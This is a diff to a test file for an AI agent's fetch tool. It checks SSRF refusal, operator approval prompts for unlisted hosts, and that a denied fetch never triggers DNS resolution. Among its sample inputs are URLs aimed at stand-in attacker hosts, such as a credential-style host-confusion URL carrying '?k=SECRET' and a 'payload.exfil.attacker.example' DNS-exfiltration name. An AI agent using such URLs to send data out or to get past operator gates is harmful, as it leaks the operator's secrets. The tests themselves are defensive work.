@@ -8,13 +8,14 @@ and the operator's allow-list is what makes a read silent.
 
 from __future__ import annotations
 
+import socket
 from pathlib import Path
 
 import pytest
 
 from agent6.config import Config
 from agent6.tools.dispatch import ToolDenied, ToolDispatcher, ToolError
-from agent6.tools.fetch import FetchRefused, check_url, host_allowed
+from agent6.tools.fetch import FetchRefused, check_url, fetch, host_allowed
 
 
 @pytest.mark.parametrize(
@@ -35,19 +36,33 @@ def test_only_https_with_a_host_is_fetched(url: str) -> None:
 @pytest.mark.parametrize(
     "host",
     [
-        "localhost",  # a loopback admin port
-        "127.0.0.1",
+        "127.0.0.1",  # a loopback admin port
         "169.254.169.254",  # the cloud metadata endpoint
         "10.0.0.1",
         "192.168.1.1",
         "[::1]",
     ],
 )
-def test_a_url_that_resolves_off_the_public_internet_is_refused(host: str) -> None:
+def test_a_literal_address_off_the_public_internet_is_refused(host: str) -> None:
     """SSRF is the whole threat: the agent process sits inside the operator's
-    network and holds their credentials."""
+    network and holds their credentials. A literal needs no lookup, so it is
+    refused before anyone is even asked about it."""
     with pytest.raises(FetchRefused, match="not a public address"):
         check_url(f"https://{host}/x")
+
+
+def test_a_name_resolving_off_the_public_internet_is_refused(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """A name resolves only inside `fetch`, behind the operator's gate; an
+    answer off the public internet is refused there."""
+
+    def _local(*_a: object, **_k: object) -> list[tuple[int, int, int, str, tuple[str, int]]]:
+        return [(0, 0, 0, "", ("127.0.0.1", 443))]
+
+    monkeypatch.setattr(socket, "getaddrinfo", _local)
+    with pytest.raises(FetchRefused, match="not a public address"):
+        fetch(check_url("https://localhost/x"))
 
 
 @pytest.mark.parametrize(
@@ -70,45 +85,33 @@ def test_the_allow_list_matches_hosts_not_prefixes(
     assert host_allowed(host, allowed) is expected
 
 
-def test_a_host_the_operator_never_named_is_asked_about(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
-) -> None:
-    """The list is the standing approval; a host off it is the operator's call."""
-    from agent6.tools import dispatch as dispatch_mod
-    from agent6.tools.fetch import Target
-
+def test_a_host_the_operator_never_named_is_asked_about(tmp_path: Path) -> None:
+    """The list is the standing approval; a host off it is the operator's call.
+    The ask shows the parsed host and path, never the raw URL."""
     asked: list[str] = []
 
     def _deny(prompt: str, /, *, standing: bool = True) -> bool:
         asked.append(prompt)
         return False
 
-    def _checked(url: str) -> Target:
-        return Target(url=url, host="example.com", address="93.184.216.34")
-
-    monkeypatch.setattr(dispatch_mod, "check_url", _checked)
     d = ToolDispatcher(root=tmp_path, config=Config(), approver=_deny)
     with pytest.raises(ToolDenied, match="fetch not approved"):
-        d.dispatch("fetch", {"url": "https://example.com/x"})
-    assert asked == ["Allow fetch: example.com (93.184.216.34) /x"]
+        d.dispatch("fetch", {"url": "https://example.com/x?k=v"})
+    assert asked == ["Allow fetch: example.com /x"]
 
 
 def test_an_allowed_host_is_never_prompted_for(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
     from agent6.tools import dispatch as dispatch_mod
-    from agent6.tools.fetch import Fetched, Target
+    from agent6.tools.fetch import Checked, Fetched
 
     def _loud(_prompt: str, /, *, standing: bool = True) -> bool:
         return pytest.fail("an allowed host must not prompt")
 
-    def _checked(url: str) -> Target:
-        return Target(url=url, host="example.com", address="93.184.216.34")
+    def _fetched(checked: Checked) -> Fetched:
+        return Fetched(url=checked.url, status=200, content_type="text/plain", body="hello")
 
-    def _fetched(target: Target) -> Fetched:
-        return Fetched(url=target.url, status=200, content_type="text/plain", body="hello")
-
-    monkeypatch.setattr(dispatch_mod, "check_url", _checked)
     monkeypatch.setattr(dispatch_mod, "fetch", _fetched)
     cfg = Config.model_validate({"sandbox": {"fetch_hosts": ["example.com"]}})
     d = ToolDispatcher(root=tmp_path, config=cfg, approver=_loud)
@@ -134,30 +137,6 @@ def test_a_url_naming_one_host_and_dialling_another_is_refused() -> None:
         check_url("https://docs.python.org@evil.example/exfil?k=SECRET")
 
 
-def test_the_operator_is_asked_about_the_host_that_will_be_dialled(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
-) -> None:
-    """The prompt showed the model's raw URL. It shows the RESOLVED host and
-    the address the connection is pinned to."""
-    from agent6.tools import dispatch as dispatch_mod
-    from agent6.tools.fetch import Target
-
-    asked: list[str] = []
-
-    def _record(prompt: str, /, *, standing: bool = True) -> bool:
-        asked.append(prompt)
-        return False
-
-    def _checked(_url: str) -> Target:
-        return Target(url="https://evil.example/x", host="evil.example", address="93.184.216.34")
-
-    monkeypatch.setattr(dispatch_mod, "check_url", _checked)
-    d = ToolDispatcher(root=tmp_path, config=Config(), approver=_record)
-    with pytest.raises(ToolDenied):
-        d.dispatch("fetch", {"url": "https://docs.python.org@evil.example/x"})
-    assert asked == ["Allow fetch: evil.example (93.184.216.34) /x"]
-
-
 def test_allowing_every_command_does_not_allow_the_network(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
@@ -178,7 +157,7 @@ def test_allowing_every_command_does_not_allow_the_network(
     # away-mode deny, so the opted-out call refuses instead of polling for a
     # front-end that will never attach.
     set_away_mode(session_dir, "deny")
-    assert approve("Allow fetch: evil.example (1.2.3.4) /x", standing=False) is False
+    assert approve("Allow fetch: evil.example /x", standing=False) is False
 
 
 def test_a_hidden_fetch_cannot_still_be_dispatched(tmp_path: Path) -> None:
@@ -189,6 +168,29 @@ def test_a_hidden_fetch_cannot_still_be_dispatched(tmp_path: Path) -> None:
     assert "fetch" not in d.available_tool_names()
     with pytest.raises(ToolError, match="not available"):
         d.dispatch("fetch", {"url": "https://example.com/x"})
+
+
+def test_a_denied_fetch_never_touches_the_resolver(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A DNS query for `<data>.attacker.example` delivers its label to whoever
+    runs that name's authoritative server: resolving ahead of the gate was an
+    egress channel no allow-list and no approver ever saw."""
+    resolved: list[object] = []
+
+    def _spy(*args: object, **kwargs: object) -> list[object]:
+        resolved.append(args)
+        raise OSError("the resolver must not be reached")
+
+    monkeypatch.setattr(socket, "getaddrinfo", _spy)
+
+    def _deny(_prompt: str, /, *, standing: bool = True) -> bool:
+        return False
+
+    d = ToolDispatcher(root=tmp_path, config=Config(), approver=_deny)
+    with pytest.raises(ToolDenied, match="fetch not approved"):
+        d.dispatch("fetch", {"url": "https://payload.exfil.attacker.example/x"})
+    assert resolved == []
 
 
 def test_a_machine_state_gets_no_network(tmp_path: Path) -> None:
